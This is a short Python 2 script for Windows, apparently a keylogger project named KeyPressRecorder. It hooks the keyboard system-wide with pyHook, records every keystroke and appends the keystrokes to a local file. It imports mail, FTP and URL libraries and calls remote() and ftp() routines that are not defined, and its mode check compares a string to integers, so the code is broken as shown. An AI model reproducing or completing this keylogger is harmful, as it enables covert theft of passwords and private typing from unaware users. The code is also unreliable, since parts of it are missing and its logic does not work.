import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import winerror, win32api, win32event
import pyHook
import pythoncom

#Disallowing Multiple Instance
# mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
# if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
#     mutex = None
#     print "Multiple Instance not Allowed"
#     exit(0)
x=''
data=''
count=0

#Local Keylogger
def local():
    global data
    if len(data)>10:
        fp=open("C:/Users/eway/Documents/GitHub/KeyPressRecorder/record", 'a')
        fp.write(data.encode('utf-8'))
        fp.close()
        data=''
    return True

def keypressed(event):
    global x,data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys 
    if x==1:  
        local()
    elif x==2:
        remote()
    elif x==4:
        ftp()

def keyPressRecorder(logType):
    global x
    x = logType
    obj = pyHook.HookManager()
    obj.KeyDown = keypressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    keyPressRecorder('local')